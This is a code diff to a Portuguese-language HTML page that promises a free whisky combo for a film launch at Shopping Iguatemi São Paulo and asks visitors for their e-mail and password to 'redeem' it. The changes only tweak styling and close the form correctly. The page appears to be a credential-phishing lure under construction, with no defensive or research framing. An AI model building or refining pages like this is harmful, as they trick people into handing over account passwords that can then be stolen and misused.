@@ -32,18 +32,21 @@ user-scalable=no">
     left: 0px;
 ">
           <img class="banner" src="img/banner.png">
-          <p class="voc-ganhou-um-combo">
+          <p class="voc-ganhou-um-combo" style="font-family: 'Averia Serif Libre';position: relative;top: 290px;">
             Você ganhou um combo de <br>Whisky Grátis em comemoração ao lançamento do filme, para resgatar
           </p>
-          <p class="text-wrapper">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
-          <form action="./" method="post" class="form">
+          <p class="text-wrapper" style="
+    position: relative;
+    top: 300px;
+">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
+<form action="./" method="post" class="form">
             <input class="PB-input" placeholder="E-Mail" style="
     font-weight: 800;color:white;
-" type="email" id="email" name="email" required>
-            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;color:white" type="password" id="senha" name="senha" required>
+" type="email" id="email" name="email" required="">
+            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;color:white" type="password" id="senha" name="senha" required="">
             <input class="PB-button" style="font-weight: 600;border:none" type="submit" value="RESGATAR COMBO!">
             <p class="p">Ao resgatar você concorda com os Termos de Uso</p>
-          </div>
+          </form>
         </div>
         
         
